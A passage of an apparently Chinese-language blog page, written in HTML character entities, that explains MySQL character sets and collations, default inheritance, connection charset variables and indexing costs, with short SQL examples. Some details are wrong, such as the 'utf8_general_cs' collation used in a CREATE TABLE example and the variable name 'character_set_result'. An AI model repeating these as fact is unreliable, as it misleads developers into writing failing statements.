&#x4F7F;&#x7528;&#x51FD;&#x6570;&#x3002;UDF&#x5728;&#x5B9E;&#x9645;&#x5DE5;&#x4F5C;&#x4E2D;&#x53EF;&#x80FD;&#x5F88;&#x5C11;&#x4F7F;&#x7528;&#xFF0C;&#x4F46;&#x4F5C;&#x4E3A;&#x5F00;&#x53D1;&#x8005;&#x7684;&#x6211;&#x4EEC;&#xFF0C;&#x4E86;&#x89E3;&#x8FD9;&#x4E48;&#x4E00;&#x6B3E;&#x5F3A;&#x5927;&#x7684;&#x5DE5;&#x5177;&#xFF0C;&#x5728;&#x89E3;&#x51B3;&#x68D8;&#x624B;&#x95EE;&#x9898;&#x65F6;&#xFF0C;&#x4E5F;&#x8BA9;&#x6211;&#x4EEC;&#x6709;&#x4E86;&#x66F4;&#x591A;&#x7684;&#x9009;&#x62E9;&#x3002;</p><h4 id="&#x5B57;&#x7B26;&#x96C6;"><a href="#&#x5B57;&#x7B26;&#x96C6;" class="headerlink" title="&#x5B57;&#x7B26;&#x96C6;"></a>&#x5B57;&#x7B26;&#x96C6;</h4><p>&#x6700;&#x540E;&#x8BF4;&#x8BF4;&#x5B57;&#x7B26;&#x96C6;&#x3002;</p><p>&#x5173;&#x4E8E;&#x5B57;&#x7B26;&#x96C6;&#x5927;&#x591A;&#x6570;&#x4EBA;&#x7684;&#x7B2C;&#x4E00;&#x5370;&#x8C61;&#x53EF;&#x80FD;&#x5C31;&#x662F;&#xFF1A;&#x6570;&#x636E;&#x5E93;&#x5B57;&#x7B26;&#x96C6;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;<code>UTF8</code>&#xFF0C;&#x56E0;&#x4E3A;<code>UTF8</code>&#x5B57;&#x7B26;&#x96C6;&#x662F;&#x76EE;&#x524D;&#x6700;&#x9002;&#x5408;&#x4E8E;&#x5B9E;&#x73B0;&#x591A;&#x79CD;&#x4E0D;&#x540C;&#x5B57;&#x7B26;&#x96C6;&#x4E4B;&#x95F4;&#x7684;&#x8F6C;&#x6362;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x53EF;&#x4EE5;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x907F;&#x514D;&#x4E71;&#x7801;&#x95EE;&#x9898;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x65B9;&#x4FBF;&#x4EE5;&#x540E;&#x7684;&#x6570;&#x636E;&#x8FC1;&#x79FB;&#x3002;But why&#xFF1F;</p><p>&#x5B57;&#x7B26;&#x96C6;&#x662F;&#x6307;&#x4E00;&#x79CD;&#x4ECE;<strong>&#x4E8C;&#x8FDB;&#x5236;&#x7F16;&#x7801;&#x5230;&#x67D0;&#x7C7B;&#x5B57;&#x7B26;&#x7B26;&#x53F7;</strong>&#x7684;&#x6620;&#x5C04;&#xFF0C;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#x6765;&#x8868;&#x793A;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x3002;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x662F;&#x6307;&#x4E00;&#x7EC4;<strong>&#x7528;&#x4E8E;&#x67D0;&#x4E2A;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#x6392;&#x5E8F;&#x89C4;&#x5219;</strong>&#xFF0C;&#x5373;&#x91C7;&#x7528;&#x4F55;&#x79CD;&#x89C4;&#x5219;&#x5BF9;&#x67D0;&#x7C7B;&#x5B57;&#x7B26;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;MySQL &#x6BCF;&#x4E00;&#x7C7B;&#x7F16;&#x7801;&#x5B57;&#x7B26;&#x90FD;&#x6709;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x3002;MySQL &#x5BF9;&#x5404;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#x652F;&#x6301;&#x90FD;&#x975E;&#x5E38;&#x5B8C;&#x5584;&#xFF0C;&#x4F46;&#x540C;&#x65F6;&#x4E5F;&#x5E26;&#x6765;&#x4E00;&#x4E9B;&#x590D;&#x6742;&#x6027;&#xFF0C;&#x67D0;&#x4E9B;&#x573A;&#x666F;&#x4E0B;&#x751A;&#x81F3;&#x4F1A;&#x6709;&#x4E00;&#x4E9B;&#x6027;&#x80FD;&#x727A;&#x7272;&#x3002;</p><p>&#x4E00;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#x53EF;&#x80FD;&#x5BF9;&#x5E94;&#x591A;&#x79CD;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF0C;&#x4E14;&#x90FD;&#x6709;&#x4E00;&#x4E2A;&#x9ED8;&#x8BA4;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF0C;&#x90A3;&#x5728; MySQL &#x4E2D;&#x662F;&#x5982;&#x4F55;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x96C6;&#x7684;&#xFF1F;&#x5728; MySQL &#x4E2D;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x4E24;&#x79CD;&#x65B9;&#x5F0F;&#x8BBE;&#x7F6E;&#x5B57;&#x7B26;&#x96C6;&#xFF1A;&#x521B;&#x5EFA;&#x5BF9;&#x8C61;&#x65F6;&#x8BBE;&#x7F6E;&#x9ED8;&#x8BA4;&#x503C;&#x3001;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x65F6;&#x663E;&#x5F0F;&#x8BBE;&#x7F6E;&#x3002;</p><p>MySQL &#x91C7;&#x7528; &#x201C;&#x9636;&#x68AF;&#x201D; &#x5F0F;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8BBE;&#x5B9A;&#x5B57;&#x7B26;&#x96C6;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x6BCF;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x6BCF;&#x5F20;&#x8868;&#x90FD;&#x6709;&#x81EA;&#x5DF1;&#x7684;&#x9ED8;&#x8BA4;&#x503C;&#xFF0C;&#x5B83;&#x4EEC;&#x9010;&#x5C42;&#x7EE7;&#x627F;&#xFF0C;&#x6700;&#x7EC8;&#x6700;&#x9760;&#x5E95;&#x5C42;&#x7684;&#x9ED8;&#x8BA4;&#x8BBE;&#x7F6E;&#x5C06;&#x5F71;&#x54CD;&#x4F60;&#x521B;&#x5EFA;&#x7684;&#x5BF9;&#x8C61;&#x3002;&#x6BD4;&#x5982;&#xFF0C;&#x521B;&#x5EFA;&#x6570;&#x636E;&#x5E93;&#x65F6;&#xFF0C;&#x5C06;&#x6839;&#x636E;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x7684;character_set_server&#x6765;&#x8BBE;&#x7F6E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x540C;&#x6837;&#x7684;&#x9053;&#x7406;&#xFF0C;&#x6839;&#x636E;database&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x6765;&#x6307;&#x5B9A;&#x5E93;&#x4E2D;&#x6240;&#x6709;&#x8868;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x2026;&#x2026; &#x4E0D;&#x7BA1;&#x662F;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#xFF0C;&#x8FD8;&#x662F;&#x8868;&#x548C;&#x5217;&#xFF0C;&#x53EA;&#x6709;&#x5F53;&#x5B83;&#x4EEC;&#x6CA1;&#x6709;&#x663E;&#x5F0F;&#x6307;&#x5B9A;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x9ED8;&#x8BA4;&#x5B57;&#x7B26;&#x96C6;&#x624D;&#x4F1A;&#x8D77;&#x4F5C;&#x7528;&#x3002;</p><p>&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x901A;&#x4FE1;&#x65F6;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x8FD9;&#x65F6;&#x5019;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x8FDB;&#x884C;&#x5FC5;&#x8981;&#x7684;&#x8F6C;&#x6362;&#x5DE5;&#x4F5C;&#x3002;&#x5F53;&#x5BA2;&#x6237;&#x7AEF;&#x5411;&#x670D;&#x52A1;&#x5668;&#x53D1;&#x9001;&#x8BF7;&#x6C42;&#x65F6;&#xFF0C;&#x6570;&#x636E;&#x4EE5;character_set_client&#x8BBE;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#xFF1B;&#x800C;&#x5F53;&#x670D;&#x52A1;&#x5668;&#x6536;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x7684; SQL &#x6216;&#x8005;&#x6570;&#x636E;&#x65F6;&#xFF0C;&#x4F1A;&#x6309;&#x7167;character_set_connection&#x8BBE;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8FDB;&#x884C;&#x8F6C;&#x6362;&#xFF1B;&#x5F53;&#x670D;&#x52A1;&#x5668;&#x5C06;&#x8981;&#x8FDB;&#x884C;&#x589E;&#x5220;&#x6539;&#x67E5;&#x7B49;&#x64CD;&#x4F5C;&#x524D;&#x4F1A;&#x518D;&#x6B21;&#x5C06;&#x6570;&#x636E;&#x8F6C;&#x6362;&#x6210;character_set_database(&#x6570;&#x636E;&#x5E93;&#x91C7;&#x7528;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x6CA1;&#x6709;&#x5355;&#x72EC;&#x914D;&#x7F6E;&#x5373;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#xFF0C;&#x5177;&#x4F53;&#x53C2;&#x8003;&#x4E0A;&#x6587;)&#xFF0C;&#x6700;&#x540E;&#x5F53;&#x670D;&#x52A1;&#x5668;&#x8FD4;&#x56DE;&#x6570;&#x636E;&#x6216;&#x8005;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x65F6;&#xFF0C;&#x5219;&#x5C06;&#x6570;&#x636E;&#x6309;character_set_result&#x8BBE;&#x7F6E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x8FDB;&#x884C;&#x7F16;&#x7801;&#x3002;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;SET CHARACTER SET&#x6765;&#x6539;&#x53D8;&#x4E0A;&#x9762;&#x7684;&#x914D;&#x7F6E;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x4E5F;&#x53EF;&#x4EE5;&#x6839;&#x636E;&#x5BF9;&#x5E94;&#x7684; API &#x6765;&#x6539;&#x53D8;&#x5B57;&#x7B26;&#x96C6;&#x914D;&#x7F6E;&#x3002;&#x5BA2;&#x6237;&#x7AEF;&#x548C;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x90FD;&#x4F7F;&#x7528;&#x6B63;&#x786E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x624D;&#x80FD;&#x907F;&#x514D;&#x5728;&#x901A;&#x4FE1;&#x4E2D;&#x51FA;&#x73B0;&#x95EE;&#x9898;&#x3002;</p><h4 id="&#x90A3;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;"><a href="#&#x90A3;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;" class="headerlink" title="&#x90A3;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;"></a>&#x90A3;&#x5982;&#x4F55;&#x9009;&#x62E9;&#x5B57;&#x7B26;&#x96C6;</h4><p>&#x5728;&#x8003;&#x8651;&#x4F7F;&#x7528;&#x4F55;&#x79CD;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x6700;&#x4E3B;&#x8981;&#x7684;&#x8861;&#x91CF;&#x56E0;&#x7D20;&#x662F;&#x5B58;&#x50A8;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5728;&#x80FD;&#x591F;&#x6EE1;&#x8DB3;&#x5B58;&#x50A8;&#x5185;&#x5BB9;&#x7684;&#x524D;&#x63D0;&#x4E0B;&#xFF0C;&#x5C3D;&#x91CF;&#x4F7F;&#x7528;&#x8F83;&#x5C0F;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x3002;&#x56E0;&#x4E3A;&#x66F4;&#x5C0F;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x610F;&#x5473;&#x7740;&#x66F4;&#x5C11;&#x7A7A;&#x95F4;&#x5360;&#x7528;&#x3001;&#x4EE5;&#x53CA;&#x66F4;&#x9AD8;&#x7684;&#x7F51;&#x7EDC;&#x4F20;&#x8F93;&#x6548;&#x7387;&#xFF0C;&#x4E5F;&#x95F4;&#x63A5;&#x63D0;&#x9AD8;&#x4E86;&#x7CFB;&#x7EDF;&#x7684;&#x6027;&#x80FD;&#x3002;&#x5982;&#x679C;&#x5B58;&#x50A8;&#x7684;&#x5185;&#x5BB9;&#x662F;&#x82F1;&#x6587;&#x5B57;&#x7B26;&#x7B49;&#x62C9;&#x4E01;&#x8BED;&#x7CFB;&#x5B57;&#x7B26;&#x7684;&#x8BDD;&#xFF0C;&#x90A3;&#x4E48;&#x4F7F;&#x7528;&#x9ED8;&#x8BA4;&#x7684;latin1&#x5B57;&#x7B26;&#x96C6;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#xFF08;MySQL 8 &#x9ED8;&#x8BA4;utf8mb4&#xFF09;&#xFF0C;&#x5982;&#x679C;&#x9700;&#x8981;&#x5B58;&#x50A8;&#x6C49;&#x5B57;&#x3001;&#x4FC4;&#x6587;&#x3001;&#x963F;&#x62C9;&#x4F2F;&#x8BED;&#x7B49;&#x975E;&#x62C9;&#x4E01;&#x8BED;&#x7CFB;&#x5B57;&#x7B26;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x4F7F;&#x7528;UTF8&#x5B57;&#x7B26;&#x96C6;&#x3002;&#x5F53;&#x7136;&#x4E0D;&#x540C;&#x5B57;&#x7B26;&#x5728;&#x4F7F;&#x7528;UTF8&#x5B57;&#x7B26;&#x96C6;&#x6240;&#x5360;&#x7528;&#x7684;&#x7A7A;&#x95F4;&#x662F;&#x4E0D;&#x540C;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#x82F1;&#x6587;&#x5B57;&#x7B26;&#x5728;UTF8&#x5B57;&#x7B26;&#x96C6;&#x4E2D;&#x53EA;&#x4F7F;&#x7528;&#x4E00;&#x4E2A;&#x5B57;&#x8282;&#xFF0C;&#x800C;&#x4E00;&#x4E2A;&#x6C49;&#x5B57;&#x5219;&#x5360;&#x7528; 3 &#x4E2A;&#x5B57;&#x8282;&#x3002;</p><p>&#x9664;&#x4E86;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x4E5F;&#x662F;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x8003;&#x8651;&#x7684;&#x95EE;&#x9898;&#x3002;&#x5BF9;&#x4E8E;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#x53EA;&#x9700;&#x8981;&#x8003;&#x8651;&#x662F;&#x5426;&#x4EE5;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#x7684;&#x65B9;&#x5F0F;&#x6BD4;&#x8F83;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x8005;&#x662F;&#x5426;&#x7528;&#x5B57;&#x7B26;&#x4E32;&#x7F16;&#x7801;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x6765;&#x6BD4;&#x8F83;&#x5927;&#x5C0F;&#xFF0C;&#x5176;&#x5BF9;&#x5E94;&#x7684;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x7684;&#x540E;&#x7F00;&#x5206;&#x522B;&#x662F;_cs&#x3001;_ci&#x548C;_bin&#x3002;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#x548C;&#x4E8C;&#x8FDB;&#x5236;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x7684;&#x4E0D;&#x540C;&#x4E4B;&#x5904;&#x5728;&#x4E8E;&#xFF0C;&#x4E8C;&#x8FDB;&#x5236;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x76F4;&#x63A5;&#x4F7F;&#x7528;&#x5B57;&#x7B26;&#x7684;&#x5B57;&#x8282;&#x8FDB;&#x884C;&#x6BD4;&#x8F83;&#xFF0C;&#x800C;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#x7684;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x5728;&#x591A;&#x5B57;&#x8282;&#x5B57;&#x7B26;&#x96C6;&#x65F6;&#xFF0C;&#x5982;&#x5FB7;&#x8BED;&#xFF0C;&#x6709;&#x66F4;&#x590D;&#x6742;&#x7684;&#x6BD4;&#x8F83;&#x89C4;&#x5219;&#x3002;&#x4E3E;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF0C;UTF8&#x5B57;&#x7B26;&#x96C6;&#x5BF9;&#x5E94;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x6709;&#x4E09;&#x79CD;&#xFF1A;</p><ul><li>utf8_bin&#x5C06;&#x5B57;&#x7B26;&#x4E32;&#x4E2D;&#x7684;&#x6BCF;&#x4E00;&#x4E2A;&#x5B57;&#x7B26;&#x7528;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x636E;&#x5B58;&#x50A8;&#xFF0C;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;</li><li>utf8_general_ci&#x4E0D;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;ci&#x4E3A;case insensitive&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x5373;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;</li><li>utf8_general_cs&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF0C;cs&#x4E3A;case sensitive&#x7684;&#x7F29;&#x5199;&#xFF0C;&#x5373;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;</li></ul><p>&#x6BD4;&#x5982;&#xFF0C;&#x521B;&#x5EFA;&#x4E00;&#x5F20;&#x8868;&#xFF0C;&#x4F7F;&#x7528;UTF8&#x7F16;&#x7801;&#xFF0C;&#x4E14;&#x5927;&#x5C0F;&#x5199;&#x654F;&#x611F;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5982;&#x4E0B;&#x8BED;&#x53E5;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE sales (</span><br><span class="line">    order_no VARCHAR(32) NOT NULL PRIMARY KEY,</span><br><span class="line">    order_amount INT NOT NULL DEFAULT 0,</span><br><span class="line">    ......</span><br><span class="line">) ENGINE=InnoDB COLLATE=utf8_general_cs;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x56E0;&#x6B64;&#xFF0C;&#x5728;&#x9879;&#x76EE;&#x4E2D;&#x76F4;&#x63A5;&#x4F7F;&#x7528;UTF8&#x5B57;&#x7B26;&#x96C6;&#x662F;&#x5B8C;&#x5168;&#x6CA1;&#x6709;&#x95EE;&#x9898;&#x7684;&#xFF0C;&#x4F46;&#x9700;&#x8981;&#x8BB0;&#x4F4F;&#x7684;&#x662F;&#x4E0D;&#x8981;&#x5728;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F7F;&#x7528;&#x591A;&#x4E2A;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x4E0D;&#x540C;&#x5B57;&#x7B26;&#x96C6;&#x4E4B;&#x95F4;&#x7684;&#x4E0D;&#x517C;&#x5BB9;&#x95EE;&#x9898;&#x5F88;&#x96BE;&#x7F20;&#x3002;&#x6709;&#x65F6;&#x5019;&#xFF0C;&#x770B;&#x8D77;&#x6765;&#x4E00;&#x5207;&#x6B63;&#x5E38;&#xFF0C;&#x4F46;&#x662F;&#x5F53;&#x67D0;&#x4E2A;&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x51FA;&#x73B0;&#x65F6;&#xFF0C;&#x4E00;&#x5207;&#x64CD;&#x4F5C;&#x90FD;&#x4F1A;&#x51FA;&#x9519;&#xFF0C;&#x800C;&#x4E14;&#x4F60;&#x5F88;&#x96BE;&#x53D1;&#x73B0;&#x9519;&#x8BEF;&#x7684;&#x539F;&#x56E0;&#x3002;</p><h4 id="&#x5B57;&#x7B26;&#x96C6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F71;&#x54CD;&#x5417;"><a href="#&#x5B57;&#x7B26;&#x96C6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F71;&#x54CD;&#x5417;" class="headerlink" title="&#x5B57;&#x7B26;&#x96C6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F71;&#x54CD;&#x5417;"></a>&#x5B57;&#x7B26;&#x96C6;&#x5BF9;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6027;&#x80FD;&#x6709;&#x5F71;&#x54CD;&#x5417;</h4><p>&#x67D0;&#x4E9B;&#x5B57;&#x7B26;&#x96C6;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x53EF;&#x80FD;&#x4F1A;&#x9700;&#x8981;&#x591A;&#x4E2A;&#x7684; CPU &#x64CD;&#x4F5C;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6D88;&#x8017;&#x66F4;&#x591A;&#x7684;&#x5185;&#x5B58;&#x548C;&#x5B58;&#x50A8;&#x7A7A;&#x95F4;&#xFF0C;&#x8FD9;&#x70B9;&#x5728;&#x524D;&#x6587;&#x5DF2;&#x7ECF;&#x8BF4;&#x8FC7;&#x3002;&#x7279;&#x522B;&#x662F;&#x5728;&#x540C;&#x4E00;&#x4E2A;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x4F7F;&#x7528;&#x4E0D;&#x540C;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#xFF0C;&#x9020;&#x6210;&#x7684;&#x5F71;&#x54CD;&#x53EF;&#x80FD;&#x4F1A;&#x66F4;&#x5927;&#x3002;</p><p>&#x4E0D;&#x540C;&#x5B57;&#x7B26;&#x96C6;&#x548C;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x4E4B;&#x95F4;&#x7684;&#x8F6C;&#x6362;&#x53EF;&#x80FD;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x7684;&#x7CFB;&#x7EDF;&#x5F00;&#x9500;&#xFF0C;&#x6BD4;&#x5982;&#xFF0C;&#x6570;&#x636E;&#x8868;sales&#x5728;buyer&#x5B57;&#x6BB5;&#x4E0A;&#x6709;&#x7D22;&#x5F15;&#xFF0C;&#x5219;&#x53EF;&#x4EE5;&#x52A0;&#x901F;&#x4E0B;&#x9762;&#x7684;ORDER BY&#x64CD;&#x4F5C;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT order_no,order_amount FROM sales ORDER BY buyer;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EA;&#x6709;&#x5F53; SQL &#x67E5;&#x8BE2;&#x4E2D;&#x6392;&#x5E8F;&#x8981;&#x6C42;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x4E0E;&#x670D;&#x52A1;&#x5668;&#x6570;&#x636E;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x76F8;&#x540C;&#x65F6;&#xFF0C;&#x624D;&#x80FD;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x8FDB;&#x884C;&#x6392;&#x5E8F;&#x3002;&#x4F60;&#x53EF;&#x80FD;&#x4F1A;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x5E9F;&#x8BDD;&#x5417;&#xFF1F;&#x5176;&#x5B9E;&#x4E0D;&#x7136;&#xFF0C;MySQL &#x662F;&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x6307;&#x5B9A;&#x6392;&#x5E8F;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x6821;&#x5BF9;&#x89C4;&#x5219;&#x7684;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-- &#x4F60;&#x8BF4;&#xFF0C;&#x8FD9;&#x4E0D;&#x662F;&#x5403;&#x9971;&#x4E86;&#x6491;&#x7684;&#x5417;&#xFF1F;&#x6211;&#x89C9;&#x5F97;&#x4E5F;&#x662F;&#xFF0C;&#x4E5F;&#x8BB8;&#x4F1A;&#x6709;&#x5176;&#x9002;&#x7528;&#x7684;&#x573A;&#x666F;&#x5427;</span><br><span class="line">-- &#x8FD9;&#x65F6;&#x5019;&#x5C31;&#x4E0D;&#x80FD;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6392;&#x5E8F;&#x5462;&#xFF0C;&#x53EA;&#x80FD;&#x4F7F;&#x7528;&#x6587;&#x4EF6;&#x6392;&#x5E8F;</span><br><span class="line">SELECT order_no,order_amount FROM sales ORDER BY buyer COLLATE utf8_bin;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5F53;&#x4F7F;&#x7528;&#x4E24;&#x4E2A;&#x5B57;&#x7B26;&#x96C6;&#x4E0D;&#x540C;&#x7684;&#x5217;&#x6765;&#x5173;&#x8054;&#x4E24;&#x5F20;&#x8868;&#x65F6;&#xFF0C;MySQL &#x4F1A;&#x5C1D;&#x8BD5;&#x8F6C;&#x6362;&#x5176;&#x4E2D;&#x4E00;&#x4E2A;&#x5217;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x3002;&#x8FD9;&#x548C;&#x5728;&#x6570;&#x636E;&#x5217;&#x5916;&#x9762;&#x5C01;&#x88C5;&#x4E00;&#x4E2A;&#x51FD;&#x6570;&#x4E00;&#x6837;&#xFF0C;&#x4F1A;&#x8BA9; MySQL &#x65E0;&#x6CD5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x5217;&#x4E0A;&#x7684;&#x7D22;&#x5F15;&#x3002;&#x5173;&#x4E8E; MySQL &#x5B57;&#x7B26;&#x96C6;&#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5751;&#xFF0C;&#x4F46;&#x5728;&#x5B9E;&#x9645;&#x5E94;&#x7528;&#x573A;&#x666F;&#x4E2D;&#x9047;&#x5230;&#x7684;&#x5B57;&#x7B26;&#x96C6;&#x95EE;&#x9898;&#xFF0C;&#x5176;&#x5B9E;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x7684;&#x591A;&#xFF0C;&#x6240;&#x4EE5;&#x5C31;&#x6B64;&#x6253;&#x4F4F;&#x3002;</p><h2 id="&#x7ED3;&#x8BED;"><a href="#&#x7ED3;&#x8BED;" class="headerlink" title="&#x7ED3;&#x8BED;"></a>&#x7ED3;&#x8BED;</h2><p>MySQL &#x8FD8;&#x6709;&#x4E00;&#x4E9B;&#x5176;&#x4ED6;&#x9AD8;&#x7EA7;&#x7279;&#x6027;&#xFF0C;&#x4F46;&#x5728;&#x5927;&#x591A;&#x6570;&#x573A;&#x666F;&#x4E0B;&#x6211;&#x4EEC;&#x5F88;&#x5C11;&#x4F1A;&#x4F7F;&#x7528;&#xFF0C;&#x56E0;&#x6B64;&#x8FD9;&#x91CC;&#x4E5F;&#x6CA1;&#x6709;&#x8BA8;&#x8BBA;&#xFF0C;&#x4F46;&#x591A;&#x4E86;&#x89E3;&#x4E00;&#x4E9B;&#x603B;&#x662F;&#x597D;&#x7684;&#xFF0C;&#x81F3;&#x5C11;&#x5728;&#x9700;&#x8981;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x4F60;&#x77E5;&#x9053;&#x6709;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x4E1C;&#x897F;&#x3002;&#x6211;&#x4EEC;&#x975E;&#x5E38;&#x591A;&#x7684;&#x4EBA;&#xFF0C;<strong>&#x603B;&#x662F;&#x4F1A;&#x8BA4;&#x4E3A;&#x81EA;&#x5DF1;&#x6240;&#x5B66;&#x7684;&#x77E5;&#x8BC6;&#x5C31;&#x50CF;&#x788E;&#x7247;&#x4E00;&#x6837;&#x4E0D;&#x6210;&#x4F53;&#x7CFB;&#xFF0C;&#x53C8;&#x627E;&#x4E0D;&#x5230;&#x89E3;&#x51B3;&#x529E;&#x6CD5;&#xFF0C;&#x90A3;&#x4F60;&#x6709;&#x6CA1;&#x6709;&#x60F3;&#x8FC7;&#x4E5F;&#x8BB8;&#x662F;&#x788E;&#x7247;&#x4E0D;&#x591F;&#x591A;&#x76